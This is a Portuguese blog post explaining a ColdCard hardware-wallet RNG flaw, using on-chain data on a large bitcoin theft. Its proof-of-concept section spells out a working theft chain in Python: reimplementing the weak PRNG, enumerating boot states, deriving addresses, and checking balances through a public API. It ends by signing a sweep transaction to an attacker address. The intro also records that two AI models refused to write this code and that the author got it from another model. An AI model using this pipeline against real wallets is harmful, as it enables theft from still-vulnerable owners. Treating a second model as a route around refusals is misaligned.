---
title: "Explorando o problema escandaloso do RNG da Coinkite"
slug: "explorando-o-problema-escandaloso-do-rng-da-coinkite"
date: '2026-08-01T09:00:00-03:00'
draft: false
translationKey: explorando-o-problema-escandaloso-do-rng-da-coinkite
description: "Como um atacante enumera o espaço reduzido de chaves da ColdCard, encontra wallets vulneráveis na blockchain pública e move os fundos. Dados reais do roubo em andamento e código didático passo a passo."
tags:
- bitcoin-e-criptomoedas
- seguranca
- hardware
---

Ontem publiquei o alerta prático: [se você guarda Bitcoin em ColdCard, mova tudo](/2026/07/31/urgente-se-voce-guarda-bitcoins-em-coldcard-mova-tudo/). Hoje vou mostrar **como** a coisa funciona do lado do atacante. Não é um tutorial pra roubar ninguém; é uma explicação didática sobre uma classe de bugs que pouca gente conhece por dentro, usando dados reais da blockchain e código que qualquer programador consegue ler.

O código didático deste artigo foi gerado com **Kimi K3**. É curioso notar que, ao mesmo prompt, tanto o **Claude** quanto o **GPT** se recusaram a produzir o mesmo tipo de exemplo — ambos alegaram risco de uso malicioso, embora o objetivo aqui seja exatamente o oposto: mostrar por que a vulnerabilidade funciona para que as vítimas entendam o risco e se protejam.

O objetivo é responder, linha a linha, a uma pergunta que muita gente fez: "se a ColdCard fica offline, como os bitcoins sumiram?".

> **Aviso:** o código aqui é educacional. Rodá-lo contra endereços que não são seus é crime. Use-o para entender o risco, testar seeds suas em ambiente controlado e reforçar por que você precisa gerar entropia nova.

## O resumo do post anterior

Entre março de 2021 e a correção de julho de 2026, vários firmwares da ColdCard geraram seeds a partir de um gerador determinístico em vez do TRNG de hardware. A culpa foi de uma integração errada: a macro `MICROPY_HW_ENABLE_RNG` foi definida como `0`, mas a guarda no `libNgU` usava `#ifndef`, que só pergunta se o símbolo existe. O build passou, a chamada `rng_get()` caiu no fallback de software [Yasmarang](http://www.literatecode.com/yasmarang) do MicroPython, e a seed passou a ser produzida a partir do UID do microcontrolador e de registradores de tempo.

Para quem não lida com hardware, vale traduzir essas siglas:

- **UID** (*Unique Identifier*) é o número de série gravado de fábrica no chip do microcontrolador. No STM32F4 usado pela ColdCard, ele tem 96 bits — algo como `0x4A3F B201 C847 D5E9 1234 5678`. Cada chip sai da linha de montagem com um UID diferente, mas ele é fixo e pode ser lido por software. Se o atacante souber (ou puder restringir) esse número, ele já elimina uma das incógnitas.
- **RTC** (*Real-Time Clock*) é o relógio de tempo real do microcontrolador. Ele continua contando mesmo quando o aparelho está "desligado" porque tem uma bateria própria (bateria de botão). Internamente ele guarda o tempo em registradores como `RTC->TR` e `RTC->SSR`. Por exemplo, `TR` pode valer `0x00000042` (contando segundos desde algum ponto de referência) e `SSR` pode valer `0x0000FFFF` (sub-segundos). Esses valores mudam a cada instante, mas no momento exato do boot eles ficam dentro de uma faixa pequena e previsível.
- **SysTick** é outro timer, este dentro do próprio núcleo ARM, que conta em alta velocidade — tipicamente de 0 até `0x00FFFFFF` e volta a zero. Quando o firmware lê esse contador no momento da criação da seed, ele captura um valor como `0x003D7A12`. O problema é que, se o RTC estável no cold boot restringe o momento do boot a poucos segundos, o SysTick só pode ter começado de um número limitado de valores iniciais — daí a [Block](https://engineering.block.xyz/blog/predictable-rng-fallback-and-32-bit-reseed-in-coldcard-firmware) estimar que isso sozinho pode limitar o espaço a ~80 mil possibilidades.

A análise da [Block](https://engineering.block.xyz/blog/predictable-rng-fallback-and-32-bit-reseed-in-coldcard-firmware) e o [backgrounder técnico da Coinkite](https://blog.coinkite.com/entropy-technical-backgrounder/) concordam no mecanismo, embora difiram nos detalhes de impacto. O post de ontem tem a tabela completa de firmwares afetados.

O ponto central é: **a entropia efetiva caiu de pelo menos 128 bits para algo na casa de 40 bits no Mk3 e 72 bits (com ressalvas) nos modelos mais novos.** Quarenta bits não são seguros. São enumeráveis com hardware barato.

## A carteira não fica "dentro" da ColdCard

Antes de entrar no ataque, vale repetir o básico. Bitcoin não fica dentro do aparelho. A blockchain pública contém UTXOs — outputs de transações — bloqueados por scripts. O que sua wallet guarda é o material para produzir assinaturas que satisfazem esses scripts.

No caso mais comum, um endereço SegWit nativo é derivado de uma chave pública, que por sua vez vem de uma chave privada, que é só um número inteiro dentro do domínio da curva `secp256k1`. Quem conhece o número pode assinar. Quem não conhece, não consegue.

Por isso a ColdCard pode estar desligada, sem bateria, dentro de um cofre. O atacante não precisa tocá-la. Ele só precisa reproduzir o mesmo número inteiro que ela sorteou. Com um RNG fraco, isso deixa de ser impossível e vira busca em espaço pequeno.

Você pode ver qualquer wallet na blockchain. Basta colar um endereço ou xpub em um explorador como o [mempool.space](https://mempool.space). O explorador mostra saldo, UTXOs e histórico porque esses dados são públicos por design. A ColdCard, a Ledger, o Sparrow, o Electrum — nenhum deles "segura" seus bitcoins; eles apenas guardam as chaves que permitem gastar os UTXOs que estão no livro-razão global.

## Como o atacante prioriza os modelos

Nem todos os modelos são igualmente fáceis de atacar. A ordem de prioridade segue o tamanho do espaço de busca:

| Modelo / firmware | O que o atacante precisa adivinhar | Espaço aproximado | Prioridade |
|---|---|---|---|
| Mk2/Mk3 v4.0.0–v4.1.9 | UID do chip, estado dos timers, histórico de chamadas ao RNG | ~40 bits no modelo da Coinkite; determinístico se tudo for conhecido | **1º — atacar primeiro** |
| Mk4/Q/Mk5 sem reseed bem-sucedido | Mesmo fallback de cima, com possível falha silenciosa no secure element | ~41 bits | **2º** |
| Mk4/Q/Mk5 com reseed normal | Estado do fallback + 32 bits do secure element | ~72 bits brutos, sendo 32 bits de verdadeiro segredo adicionado | **3º — mais caro** |
| Mk1; Mk2/Mk3 até v3.2.2 | TRNG de hardware funcionando | ~256 bits | inatingível |

Por que o Mk3 é o mais fácil? Porque nele não há nenhuma contribuição criptográfica de um secure element. O fallback Yasmarang é totalmente determinístico dado o UID e o estado do timer. Se o atacante souber (ou puder restringir) esses valores, não existe segredo residual. A Coinkite estima o espaço efetivo em cerca de 40 bits; a [Block](https://engineering.block.xyz/blog/predictable-rng-fallback-and-32-bit-reseed-in-coldcard-firmware) mostra que, se o RTC estiver estável no cold boot, o SysTick sozinho limita a ~80 mil valores, ou seja, ~16 bits.

Nos Mk4/Q/Mk5 o reseed do secure element acrescenta 32 bits. Isso é o suficiente para tornar o ataque muito mais caro — mas ainda longe dos 128 bits mínimos aceitáveis. Além disso, a Block aponta um caminho no fonte em que uma exceção capturada durante a inicialização pode fazer o reseed não acontecer, caindo de volta no espaço menor.

O atacante racional começa pelo maior retorno: Mk2/Mk3 v4. Depois parte para Mk4/Q/Mk5 apenas se tiver recursos sobrando.

## 128 bits, 40 bits e 72 bits: qual é a diferença?

Bits medem o tamanho do espaço de busca. Cada bit a mais dobra o trabalho. A diferença não é pequena — é exponencial.

Imagine que você consegue testar **1 bilhão de candidatos por segundo**:

| Bits | Candidatos | Tempo para varrer tudo |
|---|---|---|
| 40 | ~1,1 trilhão | ~18 minutos |
| 72 | ~4,7 sextilhões | ~150 mil anos |
| 128 | ~3,4 × 10³⁸ | ~10²² anos (muitas ordens de magnitude além da idade do universo) |

Outra forma de enxergar: 40 bits é como procurar uma folha específica em uma pequena floresta. 72 bits é como procurar um grão de areia específico em todas as praias do planeta. 128 bits é como procurar um átomo específico entre todos os átomos de milhares de planetas.

Por isso 40 bits não são "um pouco menos seguros" que 128. São uma categoria completamente diferente: passível de ataque prático com hardware comum. 72 bits já exige recursos sérios, mas ainda está abaixo do mínimo aceitável para guardar valor. 128 bits é o padrão porque, com a computação conhecida, não dá para vencer.

## De um número inteiro para uma wallet

Abaixo, um exemplo real de como um número (a entropia) vira seed, chave privada e endereço. Usei 16 bytes (128 bits) só para caber numa linha; a ColdCard usava 32 bytes, mas a ideia é a mesma.

```python
from embit.bip39 import mnemonic_from_bytes, mnemonic_to_seed
from embit.bip32 import HDKey
from embit.script import p2wpkh

entropy = bytes.fromhex("0123456789abcdef0123456789abcdef")  # 128 bits
mnemonic = mnemonic_from_bytes(entropy)
seed = mnemonic_to_seed(mnemonic)
root = HDKey.from_seed(seed)
key = root.derive("m/84'/0'/0'/0/0")
```

Saída:

```text
entropia (128 bits): 0123456789abcdef0123456789abcdef
mnemonic (12 palavras): abuse boss fly battle rubber wasp afraid hamster guide essence vibrant tattoo
seed (64 bytes): a3a99acc7fe076cdc923d0ae79ee735671d8d70a79de19593cca8638f3194251...
root xprv: xprv9s21ZrQH143K25JhKqEwvJW7QAiVvkmi4WRenBZanA6kxHKtKAQQKwZG65kC...
chave privada (número inteiro): 1332683685242456724974769347593961509584253593377187298409830148921683854281
endereço: bc1qxjayuwxqj04waw2j4xp5mlhjl47dzdl9mcjmnw
```

A chave privada é só um número inteiro. A partir dele, a [curva elíptica](/2019/11/26/akitando-68-entendendo-conceitos-basicos-de-criptografia-parte-2-2/) calcula a chave pública; a chave pública é hasheada até virar o endereço. O endereço é o que aparece na blockchain; o número inteiro é o que permite gastar.

No caso ColdCard, o número inteiro não tinha 128 bits de aleatoriedade real. Tinha ~40. Então, em vez de procurar uma agulha no universo, o atacante procurava uma agulha em uma floresta pequena.

## Evidência real na blockchain

Não estou inventando números. O site independente [coldcard-watch.vercel.app](https://coldcard-watch.vercel.app/) vem rastreando os drains transação a transação e publica o mínimo verificado: **1.128,6633 BTC** drenados de **2.334 endereços** confirmados. O próprio site deixa claro que esses são **mínimos verificados, não totais** — outras clusters provavelmente existem.

Ele identifica dois episódios de drenagem:

- **30 de julho de 2026**, blocos **960183 a 960191** — 1.195 endereços drenados.
- **31 de julho de 2026**, blocos **960345 a 960369** — 1.126 endereços drenados.

Os principais clusters públicos que compõem esse mínimo incluem:

- [`bc1qnk4zh9qcnap2mycp56qjrgza3cc8ylrh8fecp0`](https://mempool.space/address/bc1qnk4zh9qcnap2mycp56qjrgza3cc8ylrh8fecp0) — [recebeu 594,47723261 BTC](https://mempool.space/address/bc1qnk4zh9qcnap2mycp56qjrgza3cc8ylrh8fecp0) em 501 outputs.
- [`bc1qx76cae2706qd5q576feh7xq8rfcsjpf2htfhe3`](https://mempool.space/address/bc1qx76cae2706qd5q576feh7xq8rfcsjpf2htfhe3) — [recebeu ~398,476 BTC](https://mempool.space/tx/14edd9ee8445793c320e92e3b50365a0e18b8b25f424044bce337463f007fdd2) em uma única transação com 491 inputs ([`14edd9ee...`](https://mempool.space/tx/14edd9ee8445793c320e92e3b50365a0e18b8b25f424044bce337463f007fdd2)).
- [`bc1q8jy96fe5lf8vfugydnte3cguk92gpev7kwtp3q`](https://mempool.space/address/bc1q8jy96fe5lf8vfugydnte3cguk92gpev7kwtp3q) — [recebeu ~89,623 BTC](https://mempool.space/tx/4b50d61a3d6e54c62ee0be13d7e9a8b69bffe7fc2b2cab4e14da56e4e20440d2) em uma única transação com 204 inputs ([`4b50d61a...`](https://mempool.space/tx/4b50d61a3d6e54c62ee0be13d7e9a8b69bffe7fc2b2cab4e14da56e4e20440d2)).

Só esses três clusters já somam ~1.082 BTC; as demais transações verificadas levam o total mínimo para **1.128,6633 BTC**.

> O primeiro cluster transferiu ~562 BTC para [`bc1qq85v2c926eg6pgxhwp6q7lf6cnsz80qs3fcu9r`](https://mempool.space/address/bc1qq85v2c926eg6pgxhwp6q7lf6cnsz80qs3fcu9r); é o mesmo dinheiro, não uma quarta vítima.

Um exemplo concreto: a transação [`78ac8968ccf5a586d2fb9509f5af13f41e0a288bfa0f0b177d4e4b6bbebad05d`](https://mempool.space/tx/78ac8968ccf5a586d2fb9509f5af13f41e0a288bfa0f0b177d4e4b6bbebad05d) consolida três inputs do mesmo endereço vulnerável [`bc1qe85jr4em79p66fsszkvfhwjf6p6qst58a2ahlr`](https://mempool.space/address/bc1qe85jr4em79p66fsszkvfhwjf6p6qst58a2ahlr), sendo um deles de quase **29,9 BTC**. Os três inputs usam a mesma chave pública comprimida:

```
037dc5356b71d0209d5d97315450166c07e7bba67d2e53c0154f5c56eb06f6970e
```

Ou seja, três UTXOs diferentes, mesmo dono, mesma chave privada. O atacante encontrou essa chave e assinou tudo de uma vez.

Outros endereços de origem com valores expressivos incluem [`bc1qvshd3nv6mjjs5wtk6x5ekppakdp2trqcsdvwlf`](https://mempool.space/address/bc1qvshd3nv6mjjs5wtk6x5ekppakdp2trqcsdvwlf) (~24,08 BTC), [`bc1q30363smzw6uk5n2znj65mf9432s0e3d92e3fu5`](https://mempool.space/address/bc1q30363smzw6uk5n2znj65mf9432s0e3d92e3fu5) (~14,43 BTC) e [`bc1qgzxfgqgvnle9p6kksk35t54ycu2tx2hwau5ppw`](https://mempool.space/address/bc1qgzxfgqgvnle9p6kksk35t54ycu2tx2hwau5ppw) (~11,74 BTC). Você pode clicar em cada um e ver os UTXOs sendo movidos para um endereço de consolidação.

A Bitcoin Optech [edição 416](https://bitcoinops.org/en/newsletters/2026/07/31/#wallets-generated-by-coldcard-at-risk-of-theft) estimava perdas acima de 1.000 BTC enquanto o caso se desenrolava; o rastreamento independente agora confirma **pelo menos 1.128,6633 BTC** roubados.

## O que a timeline na blockchain sugere sobre a ordem do ataque

O [coldcard-watch](https://coldcard-watch.vercel.app/) mostra **dois episódios distintos**, separados por mais de 24 horas. O primeiro aconteceu entre os blocos 960183 e 960191 (30 de julho, por volta de 01:10 UTC); o segundo, entre 960345 e 960369 (31 de julho). Dentro do primeiro episódio, os três grandes clusters (~594, ~398 e ~89 BTC) foram minerados em blocos consecutivos — portanto, dentro de cada onda as varreduras foram disparadas praticamente ao mesmo tempo.

Essa forma de ondas separadas é compatível com duas interpretações:

1. **Mesmo atacante, pré-computação em lotes.** A primeira onda pega os alvos mais fáceis e mais bem financiados; a segunda onda vem de um segundo lote de candidatos já pré-computados.
2. **Múltiplos atacantes.** Depois que a falha se tornou pública, outros atores entraram com seus próprios dicionários de estados prováveis.

Em qualquer um dos casos, a economia do ataque favorece a ordem da tabela anterior. O Mk2/Mk3 v4 é o melhor custo-benefício:

- **~40 bits efetivos** ≈ 2^40 ≈ **1,1 trilhão** de estados candidatos.
- Numa GPU que teste 1 milhão de candidatos por segundo (incluindo derivação BIP32 e consulta ao explorer), levaria cerca de **13 dias** para varrer tudo. Com 100 GPUs/FPGAs, cai para **poucas horas**.
- Se o RTC estiver estável no cold boot, como a [Block](https://engineering.block.xyz/blog/predictable-rng-fallback-and-32-bit-reseed-in-coldcard-firmware) sugere, o SysTick sozinho reduz o espaço a ~80 mil valores (~16 bits), tornando a busca trivial em segundos.

Mk4/Q/Mk5 com reseed depende do quanto o fallback é conhecido:

- Se o fallback é conhecido, só restam os **32 bits** do secure element: 2^32 ≈ **4,3 bilhões** de candidatos por aparelho, ou cerca de **1,2 hora** por dispositivo a 1 milhão/s.
- Se o fallback é completamente desconhecido, o espaço sobe para ~2^72, cerca de **4,7 sextilhões** de candidatos — inviável por força bruta pura.

Por isso a primeira onda deve ser dominada por Mk3. A segunda onda, mais de um dia depois, pode incluir lotes adicionais do mesmo modelo ou modelos mais difíceis em que o atacante conseguiu perfilar o fallback. Sem identificar o modelo por trás de cada endereço, não dá para afirmar com certeza, mas a ordem de dificuldade está clara.

A velocidade também mostra que o ataque não começou do zero no dia 30 de julho. Para varrer 1,1 trilhão de estados e achar centenas de endereços com saldo, o atacante já tinha infraestrutura pronta ou passou dias ou semanas pré-computando antes de mover os primeiros UTXOs.

## O que a chain revela sobre a operação

O site [coldcard-hack.up.railway.app](https://coldcard-hack.up.railway.app/) analisa em detalhe as três ondas que esvaziaram 1.082,59 BTC em **41 minutos** (blocos 960183 a 960191). Embora o site avise que foi compilado por um agente de IA e não revisado por humanos, os dados da blockchain são verificáveis:

| Onda | Bloco(s) | BTC | Endereços | Observação |
|---|---|---|---|---|
| 1 | 960183 | ~89,62 | 204 | Levou tudo, inclusive poeira abaixo do valor da taxa. |
| 2 | 960185 | ~398,49 | 491 | Ataque mais denso; deixou saldos abaixo de ~0,108 BTC. |
| 3 | 960188–960191 | ~594,48 | 500 | A onda que a imprensa noticiou; começou 3,5 minutos depois da 2. |

Detalhes que saltam aos olhos:

- **Ordem por saldo:** dentro de cada onda, as transações foram ordenadas do maior para o menor saldo. Isso não é acidente; é uma fila de prioridade configurada no script.
- **Formato idêntico:** todas as 1.195 sweeps gastam todos os UTXOs de um único endereço de origem para um único output, sem troco. Não há variação manual.
- **Taxa uniforme:** mediana de 30,136986 sat/vB em todas as ondas — o mesmo script escolhendo a taxa.
- **Tipos de endereço:** 1.182 eram SegWit nativo (`v0_p2wpkh`), 7 P2SH-wrapped e 6 legacy. Portanto o ataque não se limitou a BIP84, embora a maioria dos usuários ColdCard use bech32.
- **Fundos parados:** até o momento em que o site congelou os dados, os ~1.082 BTC ainda estavam nos vaults, sem mixer, sem peel chain, sem movimentação posterior.

Tudo isso aponta para uma única operação automatizada, não para 1.195 roubos independentes.

## Como isso passou despercebido

O mesmo [coldcard-hack.up.railway.app](https://coldcard-hack.up.railway.app/) mapeia os commits que introduziram o bug. Os fatos mais graves:

- O commit que adicionou a guarda `#ifndef` errada no `libngu` teve uma mensagem de **um caractere**, alterou 28 arquivos e **não passou por pull request**.
- O commit `First pass w/ libNgU`, que migrou a geração de seeds para o libngu e removeu código GPL, alterou **120 arquivos** e também foi empurrado diretamente, sem PR.
- Os dois commits posteriores que adicionaram o reseed de 32 bits e a mistura do secure element até abriram PRs, mas **foram mergeados com zero reviews**.

Uma mudança crítica no caminho de geração de entropia passou sem revisão end-to-end. O TRNG correto existia no binário; o problema foi que o símbolo errado foi linkado, e ninguém escreveu um teste que provasse de onde a seed realmente vinha.

## O passo a passo conceitual do ataque

Antes do código, o fluxo geral:

1. **Reproduzir o RNG.** O atacante implementa o Yasmarang exatamente como no firmware, incluindo o XOR com o segundo Yasmarang do `libNgU`.
2. **Enumerar estados plausíveis.** Para cada combinação de UID, SysTick, RTC e, nos modelos novos, reseed do secure element, ele gera os 32 bytes que a ColdCard teria gerado como entropia.
3. **Derivar a wallet.** A partir dessa entropia, calcula a mnemonic BIP39, a seed BIP32, e deriva os primeiros endereços de recebimento e troco.
4. **Consultar a blockchain.** Para cada endereço derivado, pergunta a um explorador ou a um node próprio se existe UTXO.
5. **Parar no match.** Quando um endereço derivado bate com um endereço que tem saldo, o atacante já tem a chave privada correspondente.
6. **Gastar.** Com a chave privada, ele monta uma transação que move o UTXO para um endereço que ele controla.

A blockchain é o oráculo. Sem ela, o atacante não saberia qual estado gerou dinheiro real. Com ela, cada UTXO encontrado confirma que ele acertou a chave.

## Código de prova de conceito

O script abaixo é didático. Ele não foi otimizado para GPU, não roda em segundos contra 40 bits e não lida com todas as variações de firmware. O que ele faz é tornar o ataque legível, função por função.

### 1. O PRNG quebrado: Yasmarang

```python
def yasmarang_step(state):
    """state = [pad, n, d, dat]; muta a lista e devolve um uint32."""
    pad, n, d, dat = state

    pad = (pad + dat + d * n) & 0xFFFFFFFF
    pad = ((pad << 3) | (pad >> 29)) & 0xFFFFFFFF
    n = pad | 2
    d = (d ^ ((pad << 31) | (pad >> 1))) & 0xFFFFFFFF
    dat = (dat ^ (pad & 0xFF) ^ ((d >> 8) & 0xFF) ^ 1) & 0xFF

    out = (pad
           ^ ((d << 5) & 0xFFFFFFFF)
           ^ (pad >> 18)
           ^ ((dat << 1) & 0xFFFFFFFF)) & 0xFFFFFFFF

    state[:] = [pad, n, d, dat]
    return out
```

**O que faz:** implementa o gerador determinístico que estava no firmware. É a mesma função que qualquer um pode copiar do [código fonte do MicroPython](https://raw.githubusercontent.com/micropython/micropython/master/ports/stm32/rng.c).

**Exemplo de estado:**

```python
>>> s = [0x0A8CE26F, 69, 233, 0]
>>> [hex(yasmarang_step(s)) for _ in range(3)]
['0x12f99f10', '0x1e0841df', '0x8f794c6c']
```

### 2. Do estado do RNG para entropia da ColdCard

```python
def coldcard_entropy(uid_low32, systick, rtc_tr, rtc_ssr, reseed=None):
    """
    Simula o que a ColdCard fazia para gerar os 32 bytes de entropia.

    - MicroPython inicializa seu Yasmarang com:
        pad = UID_low32 ^ SysTick->VAL
        n   = RTC->TR
        d   = RTC->SSR
    - libNgU mantém um segundo Yasmarang com constantes públicas.
    - Cada palavra de 32 bits é: chip ^ my_yasmarang().
    - Nos Mk4/Q/Mk5, o reseed altera o 'pad' do estado do libNgU.
    """
    mpy_state = [uid_low32 ^ systick, rtc_tr, rtc_ssr, 0]
    libngu_state = [0x0A8CE26F, 69, 233, 0]

    if reseed is not None:
        # reseed() no firmware só sobrescreve yasmarang_pad
        libngu_state[0] = reseed & 0xFFFFFFFF

    # A ColdCard pode fazer chamadas extras antes de gerar a seed (health
    # check, etc.). Na prática o atacante modela o histórico exato de
    # chamadas. Aqui simplificamos para 8 palavras = 32 bytes.
    words = []
    for _ in range(8):
        chip = yasmarang_step(mpy_state)
        mix = chip ^ yasmarang_step(libngu_state)
        words.append(struct.pack("<I", mix))

    return b"".join(words)
```

**O que faz:** monta o estado inicial. O `pad` do MicroPython é `UID_low32 ^ SysTick`; `n` e `d` vêm do RTC. O libNgU entra com constantes públicas. Cada palavra é o XOR das duas. Esse XOR não cria aleatoriedade: se os dois lados são reproduzíveis, o resultado também é.

**Exemplo:**

```text
>>> coldcard_entropy(0xDEADBEEF, 12345, 0x123456, 78).hex()
'3013f52faaef2a65c47fee63c83e9773d505bd05e4b2b43f56bb8c60ecc66f66'
```

### 3. De entropia para endereço Bitcoin

```python
def first_addresses(entropy_bytes, account=0):
    """
    Dada a entropia bruta, gera a mnemonic BIP39, a seed BIP32 e os
    primeiros endereços SegWit nativos de recebimento e troco.
    """
    mnemonic = mnemonic_from_bytes(entropy_bytes)
    seed = mnemonic_to_seed(mnemonic)
    root = HDKey.from_seed(seed)

    addrs = {"mnemonic": mnemonic}
    for change in [0, 1]:
        for idx in range(5):
            path = f"m/84'/0'/{account}'/{change}/{idx}"
            key = root.derive(path)
            addr = p2wpkh(key.key.get_public_key()).address()
            label = "receive" if change == 0 else "change"
            addrs.setdefault(label, []).append(addr)
    return addrs
```

**O que faz:** pega os 32 bytes, transforma em 24 palavras BIP39, calcula a seed, abre a árvore BIP32 e deriva os endereços. Na prática o atacante testa dezenas ou centenas de índices e também outras contas.

**Exemplo:**

```text
>>> cand = first_addresses(coldcard_entropy(0xDEADBEEF, 12345, 0x123456, 78))
>>> cand["mnemonic"]
'copy panic episode fiction verify cream ball worry glow draft place tray expect teach bleak north reflect wide puzzle boat attract glimpse rural setup'
>>> cand["receive"][0]
'bc1qc3rmdj3ln6n05awxwetg0gz8e2aw0lzyxmaecp'
```

### 4. Consultar a blockchain como oráculo

```python
def has_utxo(address):
    """True se o endereço tiver qualquer UTXO no mempool.space."""
    url = f"https://mempool.space/api/address/{address}/utxo"
    try:
        r = requests.get(url, timeout=10)
        r.raise_for_status()
        return len(r.json()) > 0
    except Exception as e:
        print("erro consultando", address, e)
        return False
```

**O que faz:** faz a pergunta real. Sem essa consulta, o atacante não saberia se acertou. A blockchain é o oráculo.

**Exemplo de não acerto:**

```text
>>> has_utxo("bc1qc3rmdj3ln6n05awxwetg0gz8e2aw0lzyxmaecp")
False
```

O atacante descarta e passa ao próximo candidato.

**Exemplo de acerto** (o endereço real da vítima [`bc1qe85jr4em79p66fsszkvfhwjf6p6qst58a2ahlr`](https://mempool.space/address/bc1qe85jr4em79p66fsszkvfhwjf6p6qst58a2ahlr), antes do sweep):

```json
[
  {
    "txid": "78ac8968ccf5a586d2fb9509f5af13f41e0a288bfa0f0b177d4e4b6bbebad05d",
    "vout": 0,
    "value": 2989251877,
    "status": {"confirmed": true, "block_height": 960188}
  }
]
```

Quando `has_utxo` devolve `True`, o atacante sabe que a seed que ele acabou de gerar produz aquele endereço — e, portanto, a chave privada correspondente.

### 5. Enumerar candidatos e caçar

```python
def brute_mk3(uid_low32):
    """
    Exemplo para Mk3/Mk2 v4: varre SysTick e RTC plausíveis.
    Na prática o atacante usa GPUs/FPGAs e restringe o UID pelo serial.
    """
    for systick in range(80_000):
        for rtc_tr in range(0x000000, 0x240000, 0x100):
            for rtc_ssr in range(0, 256):
                yield coldcard_entropy(uid_low32, systick, rtc_tr, rtc_ssr)


def brute_mk4(uid_low32, systick, rtc_tr, rtc_ssr):
    """
    Exemplo para Mk4/Q/Mk5: o fallback é fixado e o atacante enumera
    os 2^32 valores possíveis do reseed do secure element.
    """
    for reseed in range(0x100000000):
        yield coldcard_entropy(uid_low32, systick, rtc_tr, rtc_ssr, reseed)


def hunt(uid_low32, generator):
    for entropy in generator:
        candidate = first_addresses(entropy)
        for addr in candidate["receive"] + candidate["change"]:
            if has_utxo(addr):
                print("ACERTOU!")
                print("  mnemonic:", candidate["mnemonic"])
                print("  endereço :", addr)
                return candidate


# Exemplo didático: use um UID conhecido e um gerador Mk3 reduzido.
# hunt(0xAABBCCDD, brute_mk3(0xAABBCCDD))
```

**O que fazem:** `brute_mk3` varre estados plausíveis para Mk3; `brute_mk4` varre os 2^32 reseeds do secure element; `hunt` é o loop que gera, deriva e checa. O atacante real não roda em Python; escreve isso em C/CUDA/FPGA e paraleliza por UID. Mas a lógica é idêntica.

## Depois de achar a colisão

Quando `hunt` retorna, o atacante já tem a `mnemonic` e o endereço com saldo. Com elas, ele obtém a chave privada:

```python
from embit.bip39 import mnemonic_to_seed
from embit.bip32 import HDKey

seed = mnemonic_to_seed(candidate_mnemonic)
root = HDKey.from_seed(seed)
addr_key = root.derive("m/84'/0'/0'/0/0")

print("WIF comprimido:", addr_key.key.wif())
print("Endereço      :", addr_key.address())
```

Saída típica:

```text
WIF comprimido: L1P8P5vQUoRiNXpDuezfTf3GJtsFBWyJZsvfVs2gxNtxaAXSNhhF
Endereço      : bc1qc3rmdj3ln6n05awxwetg0gz8e2aw0lzyxmaecp
```

Esse WIF é a chave privada no formato que qualquer wallet entende. A partir daqui o atacante pode:

1. **Importar a seed ou o WIF** no Sparrow, Electrum ou outra wallet.
2. **Rescanar** a blockchain para ver todos os UTXOs daquela seed.
3. **Montar uma transação** mandando os fundos para um endereço que ele controla.
4. **Assinar e transmitir**.

### Exemplo concreto de sweep

No caso real, o atacante varreu o UTXO de 29.89251877 BTC do endereço [`bc1qe85jr...`](https://mempool.space/address/bc1qe85jr4em79p66fsszkvfhwjf6p6qst58a2ahlr) para o endereço de consolidação. O que ele precisava produzir era uma transação assinada. O esqueleto, com valores didáticos e um input fictício, fica assim:

```python
from bitcoinlib.transactions import Transaction
from bitcoinlib.keys import HDKey

# chave recuperada a partir da seed colidida
key = HDKey.from_seed(candidate_mnemonic).derive("m/84'/0'/0'/0/0")

input_value  = 2_989_251_877      # 29.89251877 BTC, em satoshis
fee          = 7_380              # taxa em satoshis
output_value = input_value - fee  # o que sobra para o atacante

tx = Transaction(network='bitcoin', fee=fee, witness_type='segwit')
tx.add_input(
    'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa',  # txid do UTXO da vítima
    0,
    keys=key,
    value=input_value,
    locking_script=bytes.fromhex('0014') + key.hash160,
    script_type='sig_pubkey',
    address=key.address()
)
tx.add_output(output_value, 'bc1qqdcszapk2yjrw0esf4t0etnlpjs5krsk5e99ru')  # endereço do atacante
tx.sign()

print(tx.raw_hex())
```

Uma transação assinada válida tem esse formato (hex truncado):

```text
01000000000101aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa0000000000ffffffff...
```

O atacante transmite esse hex para qualquer node Bitcoin (mempool.space, seu próprio node, Electrum, etc.). O protocolo não pergunta de onde veio a chave; só verifica se a assinatura satisfaz o script. Se a assinatura for válida, a rede inclui a transação no próximo bloco e o UTXO muda de dono.

No ataque real, isso foi feito 1.195 vezes em 41 minutos, todos com o mesmo script, a mesma taxa e a mesma lógica de ordenação por saldo.

## O que essa classe de bugs significa

Esse não é um ataque à curva elíptica, ao SHA-256, ao BIP39 ou ao Bitcoin. É um ataque à **entropia**. O fabricante reduziu o espaço de chaves e o protocolo simplesmente aceitou as assinaturas que saíram daquele espaço menor.

Três lições:

1. **Não confie na aparência de aleatoriedade.** O output do Yasmarang passa por testes estatísticos simples e parece aleatório. Mas se o estado inicial é previsível, toda a sequência é previsível.
2. **Hash não cria entropia.** Passar 40 bits de entrada por SHA-256 duas vezes gera um hash bonito e uniforme, mas ainda existem no máximo `2^40` hashes possíveis. O atacante enumera as entradas, não os hashes.
3. **A blockchain é pública e permanente.** Uma wallet vulnerável pode ficar anos quieta até alguém ligar os pontos. No dia em que o ataque é publicado, todos os UTXOs daquele espaço de chaves viram alvos.

## Dá para pegar o criminoso?

Uma pergunta que aparece toda vez que um roubo de criptomoedas ganha escala é: "será que dá para rastrear quem fez isso?". A resposta curta é: **talvez, mas não é trivial**, e rastrear não é o mesmo que recuperar os bitcoins.

Clay Garrett, que está entre as pessoas investigando o caso, publicou [uma thread no X](https://x.com/clay_garrett/status/2083247006139503065) alegando que a equipe dele identificou um padrão de varredura incomum. Segundo a thread, o operador do ataque teria usado uma conta paga de um provedor de serviços blockchain bem conhecido para consultar os endereços-fonte e a atividade relacionada durante os sweeps. Os logs do provedor teriam correspondido, com "especificidade extraordinária", ao número, ao timing e à sequência das requisições. O provedor, segundo Garrett, estava apenas fornecendo serviços normais; as requisições em si não revelavam para que serviam.

O que isso significa, **se for confirmado**:

- Um provedor de serviços blockchain tipicamente exige conta, e muitas vezes pagamento. Isso pode deixar rastros: e-mail, método de pagamento, endereço IP, horários de acesso, padrão de uso da API.
- Se a conta passou por KYC, a probabilidade de identificar uma pessoa sobe muito. Se o pagamento foi feito com criptomoeda, voucher anônimo ou cartão de terceiros, o vínculo se torna fraco.
- Mesmo com um IP ou e-mail, o operador pode ter usado VPN, Tor, computação em nuvem descartável ou identidade roubada. Cada camada adicional reduz a chance de chegar até a pessoa real.
